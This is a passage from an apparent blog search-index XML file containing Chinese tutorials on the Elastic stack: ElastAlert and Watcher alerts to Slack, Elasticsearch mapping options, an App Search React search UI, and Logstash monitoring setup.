example_rules/example_frequency.yaml运行ElastAlert我们使用Python来直接运行Elastalert：python3 -m elastalert.elastalert --verbose --rule example_frequency.yaml这样我们的Elastalert已经被成功运行起来了。我们在这个时候可以打开我们的Kibana来监视filebeat-*索引，如果在一个小时内有三次process.name信息有JUSTME字样，那么我们就会在我们的Slack里收到一个通知。我们在Ubuntu中打开另外的一个terminal，并输入如下的命令：123sudo logger -t JUSTME this is message 1sudo logger -t JUSTME this is message 2sudo logger -t JUSTME this is message 3那么我们可以打开Kibana查看这些消息：那么这个时候，在我们的Slack中，我们可以看到如下的消息：我们收到了我们所需要的通知信息。我们也可以把通知写入到我们的邮件中去。这个由你们自己来实践了。在Elastalert的官方网站上，我们可以看到很多的通知类型。详细地址为https://elastalert.readthedocs.io/en/latest/ruletypes.html————————————————版权声明：本文为CSDN博主「Elastic 中国社区官方博客」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/UbuntuTouch/article/details/103820572]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不给字段创建索引，字段不存放在source中，字段无法聚合查询等]]></title>
    <url>%2F2020%2F01%2F06%2F%E4%B8%8D%E7%BB%99%E5%AD%97%E6%AE%B5%E5%88%9B%E5%BB%BA%E7%B4%A2%E5%BC%95%EF%BC%8C%E5%AD%97%E6%AE%B5%E4%B8%8D%E5%AD%98%E6%94%BE%E5%9C%A8source%E4%B8%AD%EF%BC%8C%E5%AD%97%E6%AE%B5%E6%97%A0%E6%B3%95%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2%E7%AD%89%2F</url>
    <content type="text"><![CDATA[某个字段不被搜索，也就是说不想为这个字段建立inverted index(反向索引)，可以这么做：12345678910111213PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;uid&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;enabled&quot;: false &#125; &#125; &#125;&#125;通过mapping对user字段进行了修改：1234&quot;user&quot;: &#123; &quot;type&quot;: &quot;object&quot;, &quot;enabled&quot;: false &#125;不想我们的整个文档被搜索:1234567PUT twitter &#123; &quot;mappings&quot;: &#123; &quot;enabled&quot;: false &#125;&#125;不想存储任何的字段,也就是说不在source中存储数据,它有完好的inverted index供查询，虽然它没有字的source。12345678PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;_source&quot;: &#123; &quot;enabled&quot;: false &#125; &#125;&#125;想节省自己的存储空间，只存储那些需要的字段到source里去使用include来包含我们想要的字段，同时我们通过exclude来去除那些不需要的字段123456789101112131415PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;_source&quot;: &#123; &quot;includes&quot;: [ &quot;*.lat&quot;, &quot;address&quot;, &quot;name.*&quot; ], &quot;excludes&quot;: [ &quot;name.surname&quot; ] &#125; &#125;&#125;默认情况下，所有支持doc值的字段均已启用它们。如果您确定不需要对字段进行排序或汇总，也不需要通过脚本访问字段值，则可以禁用doc值以节省磁盘空间：123456789101112131415161718192021222324PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;doc_values&quot;: false, &quot;ignore_above&quot;: 256 &#125;, &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125; &#125;&#125;把city字段的doc_values设置为false]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[X-Pack：创建阈值检查警报]]></title>
    <url>%2F2020%2F01%2F02%2FX-Pack%EF%BC%9A%E5%88%9B%E5%BB%BA%E9%98%88%E5%80%BC%E6%A3%80%E6%9F%A5%E8%AD%A6%E6%8A%A5%2F</url>
    <content type="text"><![CDATA[简单的事情应该简单(Simple things should be simple)，这是Elastic {ON} ‘17的主题之一，Elastics收到了许多关于使用简单易用的UI创建警报的请求。事实证明，创建单个UI以对所有类型的警报均有效地工作非常困难。例如，可以在平均CPU使用率超过50％时创建警报的UI与可以在同一IP地址上有许多并发登录的情况下创建警报的UI看起来截然不同。由于很难为所有类型的警报构建通用的UI，因此Elastic决定首先针对最常请求的警报处理UI：当指标超过或低于给定阈值时触发的简单阈值警报。在开始示例之前，请确保您具有最低版本的Elasticsearch和Kibana的6.0.0版本，并且两者都安装了X-Pack。在最新的7.x版本里，X-Pack已经是发布版的一部分，不需要安装。另外，请确保您为Elasticsearch配置了具有足够权限的用户。现在，我们需要一些有趣的数据来构建警报。 Metricbeat是监视机器上的系统和用户进程的绝佳拍子。在今天的练习里，我们来展示如何通过阈值检查，并发送通知到Slack。大家也可以尝试发送到电子邮件等方式。创建Slack账号我们首先需要创建一个自己的Slack账号(https://slack.com/)，并具有自己的管理员权限。你可以参考链接 “Configuring Slack Account”(https://www.elastic.co/guide/en/elasticsearch/reference/7.5/actions-slack.html#configuring-slack)来配置自己的Slack账号，并生成一个相应的一个Webhook URL。这个URL将会在Elasticsearch里进行使用。配置elasticsearch.yml首先watcher必须是在有账号的情况下才可以工作的。如果你还不知道如何开通一个Elasticsearch的安全，那么请参阅我之前的文章“Elasticsearch：设置Elastic账户安全”。因为这是一个付费的功能，你需要接受30天试用的条件才可以看到这个功能。为了能够使得watcher能够正常工作，我们必须配置elasticsearch.yml文件。打开elasticsearch安装目录下的config/elasticsearch.yml文件，并加入如下的配置：1234567891011121314151617xpack.security.enabled: truediscovery.type: single-node xpack.notification.slack: account: monitoring: message_defaults: from: x-pack to: notifications icon: http://example.com/images/watcher-icon.jpg attachment: fallback: &quot;X-Pack Notification&quot; color: &quot;#36a64f&quot; title: &quot;X-Pack Notification&quot; title_link: &quot;https://www.elastic.co/guide/en/x-pack/current/index.html&quot; text: &quot;One of your watches generated this notification.&quot; mrkdwn_in: &quot;pretext, text&quot;前面的两行是为了启动安全功能才进行加入的。后面的关于xpack的配置才是为watcher而设置的。配置好我们的elasticsearch.yml文件后，我们在命令行中打入如下的命令：1./bin/elasticsearch-keystore add xpack.notification.slack.account.monitoring.secure_url在这里，我们选择y。如果你是第一次运行这个命令的话，就不会有这样的一个提示了。你可以把你从Slack中配置的那个Webhook URL复制并粘贴到这里。这样我们的配置就完成了。然后，我们启动Elasticsearch。安装及配置Metricbeat只启动system模块即可。等安装好Metricbeat后，就可启动我们的metricbeat了。配置Watcher打开浏览器并导航到Kibana。单击侧面导航栏中的“Management”应用程序，然后单击Elasticsearch标题下的Watcher。我们点击Create，然后，我们就可以开始配置我们的一个watcher了。我们选择Create threashold alert:然后，我们可以按照上面的配置进行设置。再点击“Add action”：我们选择Slack作为我们的通知方法。里面还有其它的几种方式，你们可以自己去尝试。我们可以选择Send a sample message按钮来测试一下我们的Slack配置是否成功。最后，我们选择Create alert。这样就创建了一个Watcher。我们可以在Watcher页面看到我们配置的每个Watcher。上面显示我们的其中的一个watcher已经发送通知了，而且是4分钟之前发送的。我们可以在我们的Slack界面看到如下的消息：我们可以看到许多的通知信息不断地进来。它表明我们的配置是已经成功了。上面我们通过Kibana的界面配置了Watcher。事实上，我们也可以通过API的方式来配置。请详细阅读我们的文档(https://www.elastic.co/guide/en/elasticsearch/reference/7.5/how-watcher-works.html)。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.5/how-watcher-works.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Solutions：如何运用Elastic App Search快速建立出色的React搜索体验]]></title>
    <url>%2F2020%2F01%2F02%2FSolutions%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%90%E7%94%A8Elastic%20App%20Search%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B%E5%87%BA%E8%89%B2%E7%9A%84React%E6%90%9C%E7%B4%A2%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[建立搜索体验是一项艰苦的工作。 乍一看似乎很容易：建立一个搜索栏，将数据放入数据库，然后让用户输入对该数据库的查询。 但是，在数据建模，底层逻辑以及（当然）总体设计和用户体验方面，有很多事情要考虑。我们将逐步介绍如何使用Elastic的开源Search UI库构建出色的基于React的搜索体验。 大约需要30分钟，然后您便可以将搜索带到需要它的任何应用程序中。但是首先，是什么使创建搜索如此具有挑战性？搜索是很难创建的开发人员在搜索开发中采用许多错误的假设。比如许多相信的假设：“知道他们要寻找的客户将按照您期望的方式进行搜索。”“您可以编写一个查询解析器，该解析器将始终成功解析查询。”“一旦设置，下周搜索将以相同的方式进行。”“同义词很容易。”…得出的结论是，搜索面临许多挑战–而且这些挑战并不简单。 您需要考虑如何管理状态，构建用于过滤，构面，排序，分页，同义词，语言处理等等的组件，等等。 但是，总而言之：建立出色的搜索需要两个复杂的部分：(1)搜索引擎，它提供用于增强搜索功能的API(2)搜索库，它描绘了搜索体验。对于搜索引擎，我们将查看Elastic App Search。为了获得搜索体验，我们将介绍一个操作系统搜索库：Search UI。完成后，将如下所示。您也可以在地址(https://codesandbox.io/embed/happy-wilbur-hwzsh?view=preview&amp;initialpath=%3Fq%3Dfinal%20fantasy)上进行在线体验。搜索引擎: Elastic App SearchApp Search可作为付费托管服务或免费的自助托管发行版(https://www.elastic.co/downloads/app-search?ultron=searchui-howto-react&amp;blade=codeburst&amp;hulk=content)提供。 我们将在本教程中使用托管服务，但是请记住，如果您自己托管，您的团队可以免费使用带有基本许可的Search UI和App Search。计划：将代表有史以来最好的视频游戏的文档编入搜索引擎，然后设计和优化搜索体验以对其进行搜索。首先，注册14天的试用期(https://www.elastic.co/products/app-search/service?ultron=searchui-howto-react&amp;blade=codeburst&amp;hulk=content)-无需信用卡。创建一个引擎。 您可以选择13种不同的语言。我们将其命名为video-games，并将语言设置为英语。下载最佳视频游戏数据集(https://drive.google.com/file/d/14-3wzemyLzJh6XHVUotFsdl0tZ7K2v1E/view)，然后使用导入程序将其上传到App Search。接下来，单击进入引擎，然后选择“Credentials”选项卡。使用仅对video-games引擎具有Limited Engine Access的方式创建新的Public Search Key。我们可以记下我们刚创建的Public Search Key及Host Indentifier以便下面之用。尽管看起来我们目前做的并不多，但我们现在拥有功能全面的搜索引擎，可以使用完善的搜索API来搜索我们的视频游戏数据。到目前为止，这是我们所做的：创建了一个搜索引擎建立了索引文档创建一个默认的索引schema创建了一个有限的可以用于外界访问的凭证（credential）让我们开始使用“Search UI”来建立我们的搜索体验。搜索库：Search UI我们将使用create-react-app(https://github.com/facebook/create-react-app)脚手架实用程序创建一个React应用：123npm install -g create-react-appcreate-react-app video-game-search --use-npmcd video-game-search在此基础上，我们将安装Search UI和App Search连接器：1npm install --save @elastic/react-search-ui @elastic/search-ui-app-search-connector并以开发模式启动该应用程序：1npm start在您喜欢的文本编辑器中打开src/App.js我们将从一些样板代码开始，注意评论部分！12345678910111213141516171819202122232425262728293031// Step #1, import statementsimport React from &quot;react&quot;;import AppSearchAPIConnector from &quot;@elastic/search-ui-app-search-connector&quot;;import &#123; SearchProvider, Results, SearchBox &#125; from &quot;@elastic/react-search-ui&quot;;import &#123; Layout &#125; from &quot;@elastic/react-search-ui-views&quot;;import &quot;@elastic/react-search-ui-views/lib/styles/styles.css&quot;;// Step #2, The connectorconst connector = new AppSearchAPIConnector(&#123; searchKey: &quot;[YOUR_SEARCH_KEY]&quot;, engineName: &quot;video-games&quot;, hostIdentifier: &quot;[YOUR_HOST_IDENTIFIER]&quot;&#125;); // Step #3: Configuration optionsconst configurationOptions = &#123; apiConnector: connector // Let&apos;s fill this in together.&#125;; // Step #4, SearchProvider: The finishing touchesexport default function App() &#123; return ( &lt;SearchProvider config=&#123;configurationOptions&#125;&gt; &lt;div className=&quot;App&quot;&gt; &lt;Layout // Let&apos;s fill this in together. /&gt; &lt;/div&gt; &lt;/SearchProvider&gt; );&#125;Step 1: 导入声明我们需要导入我们的Search UI依赖关系和React。核心组件，连接器和视图组件包含在三个不同的程序包中：123@elastic/search-ui-app-search-connector@elastic/react-search-ui@elastic/react-search-ui-views继续进行时，我们将详细了解它们1234import React from &quot;react&quot;;import AppSearchAPIConnector from &quot;@elastic/search-ui-app-search-connector&quot;;import &#123; SearchProvider, Results, SearchBox &#125; from &quot;@elastic/react-search-ui&quot;;import &#123; Layout &#125; from &quot;@elastic/react-search-ui-views&quot;;我们还将为该项目导入默认样式表，这将使我们拥有良好的外观，而无需编写我们自己的CSS行：1import &quot;@elastic/react-search-ui-views/lib/styles/styles.css&quot;;Step 2: 连接器我们有来自App Search的Public Search Key和Host Identifier。是时候让他们工作了！Search UI中的连接器对象使用credentials连接到App Search和超级搜索：12345const connector = new AppSearchAPIConnector(&#123; searchKey: &quot;[YOUR_SEARCH_KEY]&quot;, engineName: &quot;video-games&quot;, hostIdentifier: &quot;[YOUR_HOST_IDENTIFIER]&quot;&#125;);搜索用户界面可与任何搜索API配合使用。 但是通过连接器可以使搜索API正常工作，而无需进行任何更深入的配置。Step 3: configurationOptions在深入探讨configurationOptions之前，让我们花点时间进行反思。我们将一组数据导入了搜索引擎。 但是，它是什么样的数据？我们对数据了解的越多，我们就会越了解如何将数据呈现给搜索者。 这样一来，您便可以了解如何配置搜索体验。我们来看一个对象，这是该数据集中所有对象中的一个：12345678910111213&#123; &quot;id&quot;:&quot;final-fantasy-vii-ps-1997&quot;, &quot;name&quot;:&quot;Final Fantasy VII&quot;, &quot;year&quot;:1997, &quot;platform&quot;:&quot;PS&quot;, &quot;genre&quot;:&quot;Role-Playing&quot;, &quot;publisher&quot;:&quot;Sony Computer Entertainment&quot;, &quot;global_sales&quot;:9.72, &quot;critic_score&quot;:92, &quot;user_score&quot;:9, &quot;developer&quot;:&quot;SquareSoft&quot;, &quot;image_url&quot;:&quot;https://r.hswstatic.com/w_907/gif/finalfantasyvii-MAIN.jpg&quot;&#125;我们看到它有几个文本字段，例如name，year，platform等等，还有一些数字字段，例如critic_score，global_sales和user_score。如果我们提出三个关键问题，我们将足够了解，以提供扎实的搜索体验：大多数人将如何搜索？ 以视频游戏的名称命名。大多数人想要看到的结果是什么？ 视频游戏的名称，类型，发行商，得分和平台。大多数人将如何过滤，排序和构面？ 按得分，体裁，发布者和平台分类。然后，我们可以将这些答案转换为我们的configurationOptions：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071const configurationOptions = &#123; apiConnector: connector, searchQuery: &#123; search_fields: &#123; // 1. Search by name of video game. name: &#123;&#125; &#125;, // 2. Results: name, genre, publisher, scores, and platform. result_fields: &#123; name: &#123; // A snippet means that matching search terms will be wrapped in &lt;em&gt; tags. snippet: &#123; size: 75, // Limit the snippet to 75 characters. fallback: true // Fallback to a &quot;raw&quot; result. &#125; &#125;, genre: &#123; snippet: &#123; size: 50, fallback: true &#125; &#125;, publisher: &#123; snippet: &#123; size: 50, fallback: true &#125; &#125;, critic_score: &#123; // Scores are numeric, so we won&apos;t snippet. raw: &#123;&#125; &#125;, user_score: &#123; raw: &#123;&#125; &#125;, platform: &#123; snippet: &#123; size: 50, fallback: true &#125; &#125;, image_url: &#123; raw: &#123;&#125; &#125; &#125;, // 3. Facet by scores, genre, publisher, and platform, which we&apos;ll use to build filters later. facets: &#123; user_score: &#123; type: &quot;range&quot;, ranges: [ &#123; from: 0, to: 5, name: &quot;Not good&quot; &#125;, &#123; from: 5, to: 7, name: &quot;Not bad&quot; &#125;, &#123; from: 7, to: 9, name: &quot;Pretty good&quot; &#125;, &#123; from: 9, to: 10, name: &quot;Must play!&quot; &#125; ] &#125;, critic_score: &#123; type: &quot;range&quot;, ranges: [ &#123; from: 0, to: 50, name: &quot;Not good&quot; &#125;, &#123; from: 50, to: 70, name: &quot;Not bad&quot; &#125;, &#123; from: 70, to: 90, name: &quot;Pretty good&quot; &#125;, &#123; from: 90, to: 100, name: &quot;Must play!&quot; &#125; ] &#125;, genre: &#123; type: &quot;value&quot;, size: 100 &#125;, publisher: &#123; type: &quot;value&quot;, size: 100 &#125;, platform: &#123; type: &quot;value&quot;, size: 100 &#125; &#125; &#125;&#125;;我们已经将Search UI连接到我们的搜索引擎，现在我们有一些选项可以控制我们如何搜索数据，显示结果并探索这些结果。 但是我们需要一些东西来将所有内容绑定到Search UI的动态前端组件。Step 4: SearchProvider这是统治所有对象的对象。 SearchProvider是所有其他组件嵌套的地方。Search UI提供了一个Layout组件，用于绘制典型的搜索布局。 有很深的自定义选项，但我们不会在本教程中介绍。我们将做两件事：将configurationOptions传递给SearchProvider。将一些结构性构建基块放入Layout中，并添加两个基本组件：SearchBox和Results。12345678910111213export default function App() &#123; return ( &lt;SearchProvider config=&#123;configurationOptions&#125;&gt; &lt;div className=&quot;App&quot;&gt; &lt;Layout header=&#123;&lt;SearchBox /&gt;&#125; // titleField is the most prominent field within a result: the result header. bodyContent=&#123;&lt;Results titleField=&quot;name&quot; urlField=&quot;image_url&quot; /&gt;&#125; /&gt; &lt;/div&gt; &lt;/SearchProvider&gt; );&#125;至此，我们已经在前端建立了基础。 在运行此后端之前，还有一些其他细节需要在后端解决。 我们还应该研究相关性模型，以便针对该项目的独特需求微调搜索。重新进入搜索平台App Search具有强大且完善的搜索引擎功能。 它使曾经复杂的调优变得更加有趣。 只需单击几下，我们便可以进行细粒度的相关性调整和无缝的模式更改。我们将首先调整schema以使其实际运行。登录到App Search，输入video-games引擎，然后单击“Manage”部分下的“Schema”。出现架构。 默认情况下，这11个字段中的每一个均被视为文本。在configurationOptions对象中，我们定义了两个范围构面来帮助我们搜索数字：user_score和critic_score。 为了使range facet按预期工作，字段类型必须为数字(number)。单击每个字段旁边的下拉菜单，将其更改为数字，然后单击“Update Types”。引擎会即时重新更新索引。 然后，当我们将构面（facet）组件添加到布局中时，范围过滤器将按预期运行。 现在，进入真正的漂亮东西。下面的部分是高度相关的具有三个关键的相关功能：Synonyms，Curations和Relevance Tuning。在边栏中的“Search Settings”部分下选择每个功能：Synonyms世界各地的人们使用不同的词来形容事物。 同义词可帮助您创建被视为一个或一组相同的术语集。就video game搜索引擎而言，我们知道人们会希望找到Final Fantasy。 但是也许他们会改用FF。单击进入同义词，然后选择创建同义词集并输入术语：单击Save。 您可以根据需要添加任意多个同义词集。现在，搜索FF与搜索Final Fantasy的权重相同。CurationsCurations是最最让人喜欢的。 如果有人搜索Final Fantasy或FF，该怎么办？ 系列赛中有很多游戏-他们会得到哪些？默认情况下，前五个结果如下所示：1.最终幻想VIII2.最终幻想X3.最终幻想策略4.最终幻想IX5.最终幻想XIII这似乎不正确……Final Fantasy VII是所有游戏中最好的Final Fantasy游戏。 而且Final Fantasy XIII不是很好！ 😜我们可以做到这一点，以便搜索Final Fantasy的人会收到Final Fantasy VII作为第一结果吗？ 我们可以从搜索结果中删除Final Fnatasy XIII吗？我们可以！单击“Curations”，然后输入查询：“Final Fantasy”。接下来，通过抓住表格最左侧的把手将“Final FantasyVII”文档拖到“Promoted Documents”部分。 然后单击“Final Fantasy XIII”文档上的“Hide Result”按钮（那个有一条线穿过眼睛的图标，下图列表中第三个图标）：现在，执行“Final Fantasy”或“FF”搜索的任何人都将首先看到“Final Fantasy VII”。他们根本看不到Final Fantasy XIII。 哈！我们可以升级和隐藏许多文档。 我们甚至可以对升级后的文档进行排序，因此我们可以完全控制每个查询顶部显示的内容。Relevance tuning单击边栏中的“Relevance Tuning”。我们搜索一个文本字段：name字段。 但是，如果我们有多个文本字段可供人们搜索，例如name字段和description字段，该怎么办？ 我们正在使用的video game数据集不包含description字段，因此我们假想一些文档以进行仔细考虑。说我们的文档看起来像这样：12345678&#123; &quot;name&quot;:&quot;Magical Quest&quot;, &quot;description&quot;: &quot;A dangerous journey through caves and such.&quot; &#125;,&#123; &quot;name&quot;:&quot;Dangerous Quest&quot;, &quot;description&quot;: &quot;A magical journey filled with magical magic. Highly magic.&quot; &#125;如果有人想找到游戏Magical Quest，他们会输入该内容作为查询。 但是第一个结果将是Dangerous Quest：为什么？ 因为在“Dangerous”的description中“Magical”一词出现了3次，所以搜索引擎不会知道一个字段比另一个字段更重要。 然后，它将使“Dangerous Quest”的排名更高。 这就是为什么存在相关性调整的难题。我们可以选择一个字段，除其他外，还可以增加其相关性的权重：我们看到，当我们增加权重时，正确的项目“ Magical Quest”上升到顶部，因为name字段变得更重要。 我们需要做的就是将滑块拖动到更高的值，然后单击“Save”。现在，我们已经使用App Search实现了如下的任务：调整schema，并将user_score和critic_score更改为数字字段。微调关联（relevance）模型。这样就总结出了精美的“仪表板”功能-每个功能都有一个匹配的API端点，如果您不是GUI的用户，则可以使用它们使程序以编程方式工作。现在，让我们结束UI。最后加工此时，您的UI应该可以正常工作了。 尝试一些查询。 首先要说的是，我们缺少探索结果的工具，例如过滤，分面(facet)，排序等，但是搜索有效。 我们需要完善用户界面。在初始的src/App.js文件中，我们导入了三个基本组件：1import &#123; SearchProvider, Results, SearchBox &#125; from &quot;@elastic/react-search-ui&quot;;根据我们为配置选项定义的内容，让我们添加更多内容。导入以下组件将启用UI中缺少的功能：PagingInfo：在当前页面上显示信息。ResultsPerPage：配置每页上显示多少个结果。Paging：浏览不同的页面。Facet：以数据类型独有的方式过滤和浏览数据。Sort：重新定向给定字段的结果。12345678910import &#123; PagingInfo, ResultsPerPage, Paging, Facet, SearchProvider, Results, SearchBox, Sorting&#125; from &quot;@elastic/react-search-ui&quot;;导入后，可以将组件放置到布局中。布局组件将页面分为多个部分，可以通过prop将组件放置在这些部分中。它包含以下部分：header：搜索框/栏bodyContent：结果容器sideContent：侧边栏，其中包含构面和排序选项bodyHeader：围绕结果的“包装器”，其中包含上下文丰富的信息，例如当前页面和每页结果数bodyFooter：用于在页面之间快速导航的分页选项组件呈现数据。根据我们在configurationOptions中提供的搜索设置获取数据。现在，我们将每个组件放置在适当的布局部分中。例如，我们在configurationOptions中描述了五个方面的维度，因此我们将创建五个方面的组件。每个Facet组件都将使用“字段”属性作为返回数据的键。我们将它们与我们的Sorting组件一起放在sideContent部分中，然后将Paging，PagingInfo和ResultsPerPage组件放在最适合它们的部分中：1234567891011121314151617181920212223242526272829303132333435&lt;Layout header=&#123;&lt;SearchBox /&gt;&#125; bodyContent=&#123;&lt;Results titleField=&quot;name&quot; urlField=&quot;image_url&quot; /&gt;&#125; sideContent=&#123; &lt;div&gt; &lt;Sorting label=&#123;&quot;Sort by&quot;&#125; sortOptions=&#123;[ &#123; name: &quot;Relevance&quot;, value: &quot;&quot;, direction: &quot;&quot; &#125;, &#123; name: &quot;Name&quot;, value: &quot;name&quot;, direction: &quot;asc&quot; &#125; ]&#125; /&gt; &lt;Facet field=&quot;user_score&quot; label=&quot;User Score&quot; /&gt; &lt;Facet field=&quot;critic_score&quot; label=&quot;Critic Score&quot; /&gt; &lt;Facet field=&quot;genre&quot; label=&quot;Genre&quot; /&gt; &lt;Facet field=&quot;publisher&quot; label=&quot;Publisher&quot; isFilterable=&#123;true&#125; /&gt; &lt;Facet field=&quot;platform&quot; label=&quot;Platform&quot; /&gt; &lt;/div&gt; &#125; bodyHeader=&#123; &lt;&gt; &lt;PagingInfo /&gt; &lt;ResultsPerPage /&gt; &lt;/&gt; &#125; bodyFooter=&#123;&lt;Paging /&gt;&#125;/&gt;现在，让我们看一下本地开发环境中的搜索体验。好多了！ 我们提供了丰富的选项来探索搜索结果。我们引入了一些额外的好处，例如多种排序选项，并且通过添加单个标志使发布者的面可过滤。 尝试使用空白查询进行搜索并浏览所有选项。最后，让我们看一下搜索体验的最后一项功能。 这是一个受欢迎的…自动完成 (Autocomplete)搜索者喜欢自动完成功能，因为它可以提供即时反馈。 它的建议有两种形式：结果和查询。 取决于哪种口味，搜索者将收到相关结果或可能导致结果的潜在查询。我们将重点关注自动填充作为一种查询建议形式。这需要两个快速更改。首先，我们需要将自动完成功能添加到configurationOptions对象中：123456789101112131415const configurationOptions = &#123; autocompleteQuery: &#123; suggestions: &#123; types: &#123; documents: &#123; // Which fields to search for suggestions fields: [&quot;name&quot;] &#125; &#125;, // How many suggestions appear size: 5 &#125; &#125;, ...&#125;;其次，我们需要根据SearchBox启用自动填充功能：123456... &lt;Layout ... header=&#123;&lt;SearchBox autocompleteSuggestions=&#123;true&#125; /&gt;&#125;/&gt;...是的，就是这样。尝试搜索-键入时，将显示自动完成查询建议。总结现在，我们拥有美观的功能性搜索体验。 而且，我们避免了人们在尝试实施搜索时经常会遇到的一堆陷阱。 30分钟还不错，你不是说吗？你可以在地址进行一个完美的体验。如果你想进一步动态生成数据集，请参阅文章https://swiftype.com/documentation/app-search/api/documents#create你可以在如下地址找到这个项目的源码：https://github.com/liu-xiao-guo/swiftype-video-game-search参考：【1】How to Build Great React Search Experiences Quickly————————————————版权声明：本文为CSDN博主「Elastic官方博客」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/UbuntuTouch/article/details/103101698]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Logstash 启动监控及集中管理]]></title>
    <url>%2F2020%2F01%2F02%2FLogstash%20%E5%90%AF%E5%8A%A8%E7%9B%91%E6%8E%A7%E5%8F%8A%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[在本篇文章里，我将详细介绍如果启动Logstash的监控及集中管理。前提条件安装好Logstash，设置Elasticsearch及Kibana的安全密码。如何监控Logstash?我们安装如下的步骤来实现监控Logstash的目的：Step 1: 在Kibana中启动监控：然后，我们可以看到如下的画面：Step 2：配置Logstash如果我们在没有配置Logstash的情况下直接运行Logstash，我们会发现如下的错误：123456789101112131415161718liuxg-2:logstash-7.5.0 liuxg$ ./bin/logstashJava HotSpot(TM) 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release.WARNING: An illegal reflective access operation has occurredWARNING: Illegal reflective access by com.headius.backport9.modules.Modules (file:/Users/liuxg/elastic5/logstash-7.5.0/logstash-core/lib/jars/jruby-complete-9.2.8.0.jar) to field java.io.FileDescriptor.fdWARNING: Please consider reporting this to the maintainers of com.headius.backport9.modules.ModulesWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operationsWARNING: All illegal access operations will be denied in a future releaseThread.exclusive is deprecated, use Thread::MutexSending Logstash logs to /Users/liuxg/elastic5/logstash-7.5.0/logs which is now configured via log4j2.propertiesERROR: Pipelines YAML file is empty. Location: /Users/liuxg/elastic5/logstash-7.5.0/config/pipelines.ymlusage: bin/logstash -f CONFIG_PATH [-t] [-r] [] [-w COUNT] [-l LOG] bin/logstash --modules MODULE_NAME [-M &quot;MODULE_NAME.var.PLUGIN_TYPE.PLUGIN_NAME.VARIABLE_NAME=VALUE&quot;] [-t] [-w COUNT] [-l LOG] bin/logstash -e CONFIG_STR [-t] [--log.level fatal|error|warn|info|debug|trace] [-w COUNT] [-l LOG] bin/logstash -i SHELL [--log.level fatal|error|warn|info|debug|trace] bin/logstash -V [--log.level fatal|error|warn|info|debug|trace] bin/logstash --help[2019-12-30T15:32:49,899][ERROR][org.logstash.Logstash ] java.lang.IllegalStateException: Logstash stopped processing because of an error: (SystemExit) exit首先在Logstash的安装目录中找到logstash的配置文件logstash.yml：我们可以在Logstash的根目录下运行一下的命令：1./bin/logstash-keystore create上面的命令将创建一个Created Logstash keystore：我们可以利用如下的命令来创建一些key: ES_HOST及ES_PWD。1./bin/logstash-keystore add ES_HOST当我们运行时，可以把我们的Elasticsearch的host地址粘贴过来：比如针对我们的情况，我们粘贴的地址是http://localhost:9200/。按照同样的方法，我们可以创建另外一个ES_PWD key：1./bin/logstash-keystore add ES_PWD这些key可以在logstash的配置文件中所使用。这样我们可以不暴露我们的密码给别人看到。我们打开logstash.yml文件，并同时使用如下的配置：1234xpack.monitoring.enabled: truexpack.monitoring.elasticsearch.username: logstash_systemxpack.monitoring.elasticsearch.password: &quot;$&#123;ES_PWD&#125;&quot;xpack.monitoring.elasticsearch.hosts: [&quot;$&#123;ES_HOST&#125;&quot;]这里，我们打开monitoring的开关，并同时使用我们在创建安全账户已经创建好的用户名logstash_system:现在我们下载一个我之前做个的一个练习：1git clone https://github.com/liu-xiao-guo/logstash_multi-pipeline我们可以下载到我们指定的目录里。但是记得修改在apache.conf中的path路径，否则我们会错的。123456789101112131415161718192021222324252627282930313233343536apache.confinput &#123; file &#123; path =&gt; &quot;/Users/liuxg/data/multi-pipeline/apache.log&quot; start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;/dev/null&quot; # ignore_older =&gt; 100000 type =&gt; &quot;apache&quot; &#125;&#125;filter &#123; grok &#123; match =&gt; &#123; &quot;message&quot; =&gt; &apos;%&#123;IPORHOST:clientip&#125; %&#123;USER:ident&#125; %&#123;USER:auth&#125; \[%&#123;HTTPDATE:timestamp&#125;\] &quot;%&#123;WORD:verb&#125; %&#123;DATA:request&#125; HTTP/%&#123;NUMBER:httpversion&#125;&quot; %&#123;NUMBER:response:int&#125; (?:-|%&#123;NUMBER:bytes:int&#125;) %&#123;QS:referrer&#125; %&#123;QS:agent&#125;&apos; &#125; &#125;&#125;output &#123; stdout &#123; codec =&gt; rubydebug &#125; elasticsearch &#123; hosts =&gt; [&quot;$&#123;ES_HOST&#125;&quot;] user =&gt; &quot;elastic&quot; password =&gt; &quot;$&#123;ES_PWD&#125;&quot; index =&gt; &quot;apache_log&quot; template =&gt; 